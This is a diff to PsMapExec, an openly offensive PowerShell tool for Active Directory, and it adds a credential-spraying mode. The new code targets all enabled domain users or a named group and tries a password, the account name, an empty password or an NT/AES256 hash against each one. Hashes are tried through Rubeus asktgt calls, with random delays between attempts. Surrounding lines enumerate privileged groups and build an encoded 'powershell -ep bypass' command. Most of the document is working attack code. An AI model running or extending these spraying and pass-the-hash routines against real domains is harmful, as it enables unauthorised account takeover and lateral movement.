@@ -67,8 +67,16 @@ Param(
     [Switch]$EmptyPassword
 )
 
+# Check for mandatory parameter
+
+
 $startTime = Get-Date
 Set-Variable MaximumHistoryCount 32767
+
+# Set the targets variable if not provided when spraying
+if ($Method -eq "Spray" -and $Targets -eq ""){
+$Targets = "all"
+}
 
 ################################################################################################################
 ###################################### Banner and version information ##########################################
@@ -90,6 +98,14 @@ Write-Host "https://github.com/The-Viper-One"
 Write-Host "Version : " -NoNewline
 Write-Host "0.3.3"
 Write-Host
+
+# If no targets have been provided
+if (-not $Targets -and $Method -ne "Spray") {
+    Write-host "[-]  " -ForegroundColor "Red" -NoNewline
+    Write-host "You must provide a value for -targets (all, servers, DCs, Workstations)"
+    return
+}
+
 
 
 ################################################################################################################
@@ -134,8 +150,9 @@ function Check-CurrentUser {
         [string]$Hash
     )
 
-
+    if ($Method -eq "Spray"){return}
     if ($CurrentUser){return}
+    
 
     if ($Username) {
         $CurrentUser = $True
@@ -281,6 +298,8 @@ $CheckAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.Windows
 ########################################## Domain Target Acquisition ###########################################
 ################################################################################################################
 
+
+if ($Method -ne "Spray"){
 $directoryEntry = [ADSI]"LDAP://$domain"
 $searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
 $searcher.PageSize = 1000
@@ -312,7 +331,8 @@ $computers = $searcher.FindAll() | Where-Object { $_.Properties["dnshostname"][0
 
 }
 
-elseif ($Targets -is [string]) {
+elseif ($Method -ne "Spray"){
+if ($Targets -is [string]) {
     $ipAddress = [System.Net.IPAddress]::TryParse($Targets, [ref]$null)
     if ($ipAddress) {
         Write-Host "IP Addresses not yet supported" -ForegroundColor "Red"
@@ -329,16 +349,15 @@ elseif ($Targets -is [string]) {
         }
         
         $computers = $searcher.FindAll() | Where-Object { $_.Properties["dnshostname"][0] -in $Targets }
+            
+            }
+        }
     }
 }
 
 
-else {
-    Write-Host "Invalid value for Targets. Must be Workstations, Servers, DC, All, an IP address or a system name." -ForegroundColor "Red"
-    break
-}
 # Dispose the searcher after use
-$searcher.Dispose()
+#$searcher.Dispose()
 
 
 
@@ -399,6 +418,33 @@ $FQDNDomainPlusDomainAdmins = $DomainAdmins | ForEach-Object { "$FQDNDomainName\
 $FQDNDomainPlusEnterpriseAdmins = $EnterpriseAdmins | ForEach-Object { "$FQDNDomainName\$_" }
 $FQDNDomainPlusServerOperators = $ServerOperators | ForEach-Object { "$FQDNDomainName\$_" }
 $FQDNDomainPlusAccountOperators = $AccountOperators | ForEach-Object { "$FQDNDomainName\$_" }
+
+if ($Method -eq "Spray") {
+    if ($Targets -eq "" -or $Targets -eq "all" -or $Targets -eq "Domain Users") {
+        $Targets = $EnabledDomainUsers
+    }
+    elseif ($Targets -in $EnabledDomainUsers) {
+        $EnabledDomainUsers = $Targets
+    }
+    else {
+        $groupMembers = Get-GroupMembers -GroupName $Targets
+        if ($groupMembers.Count -gt 0) {
+            $EnabledDomainUsers = $groupMembers
+        }
+        elseif ($groupMembers.Count -eq 0) {
+            Write-host "[-] " -ForegroundColor "Red" -NoNewline
+            Write-host "Group either does not exist or is empty"
+            return
+        }
+        else {
+            Write-host "[-] " -ForegroundColor "Red" -NoNewline
+            Write-Host "Unspecified Error"
+            return
+        }
+    }
+}
+
+
 
 
 # Grab Computer Accounts for spraying
@@ -1142,9 +1188,10 @@ $Command = "powershell.exe -ep bypass -enc $base64Command"
 ################################# Logic to help keep output tidy and even ######################################
 ################################################################################################################
 
+if ($Method -ne "Spray"){
 $NameLength = ($computers | ForEach-Object { $_.Properties["dnshostname"][0].Length } | Measure-Object -Maximum).Maximum
 $OSLength = ($computers | ForEach-Object { $_.Properties["operatingSystem"][0].Length } | Measure-Object -Maximum).Maximum
-
+}
 
 ################################################################################################################
 ################################################ Function: WMI #################################################
@@ -3470,10 +3517,15 @@ $runspacePool.Dispose()
 ################################################################################################################
 Function Spray {
 Write-host
-    
+
 if (!$EmptyPassword -and !$AccountAsPassword -and $Hash -eq "" -and $Password -eq ""){
 Write-Host "[-] " -ForegroundColor "Red" -NoNewline
 Write-Host "We need something to spray"
+Write-Host
+Write-host "PsMapExec -Method Spray -Password [Password]"
+Write-host "PsMapExec -Method Spray -Hash [Hash]"
+Write-host "PsMapExec -Method Spray -AccountAsPassword"
+Write-host "PsMapExec -Method Spray -EmptyPassword"
 return
 }
 
@@ -3550,8 +3602,16 @@ Write-Output " - Safety Limit value : $SafeLimit"
 Write-Output " - Removed disabled accounts from spraying"
 
 if ($Hash -ne ""){
+    Write-Host
     $Password = ""
     $AccountAsPassword = $False
+
+    if ($Hash.Length -ne 32 -and $Hash.Length -ne 64) {
+        Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+        Write-Host "Supply either a 32-character RC4/NT hash or a 64-character AES256 hash"
+        Write-Host 
+        return
+    }
 
     Write-Host
     Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
@@ -3594,7 +3654,6 @@ if ($EmptyPassword){
 }
 
 
-
 foreach ($UserToSpray in $EnabledDomainUsers){
 		$Delay = Get-Random -Minimum 8 -Maximum 90
 		Start-Sleep -Milliseconds $Delay
@@ -3610,11 +3669,10 @@ $searchResult = $searcher.FindOne()
                     continue
     }
 }
-
+           # Hash Spraying
             if ($Hash -ne ""){
-            
             if ($Hash.Length -eq 32){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /rc4:$Hash /domain:$domain" | Out-String}
-            if ($Hash.Length -eq 64){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /aes256:$Hash /domain:$domain" | Out-String}
+            elseif ($Hash.Length -eq 64){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /aes256:$Hash /domain:$domain" | Out-String}
             
             # Check for Unhandled Rubeus exception
             if ($Attempt.IndexOf("Unhandled Rubeus exception:") -ne -1) {
@@ -3693,6 +3751,7 @@ $searchResult = $searcher.FindOne()
             Write-Host "$Domain\$UserToSpray"
             }
         }
+    
     }
 }
 
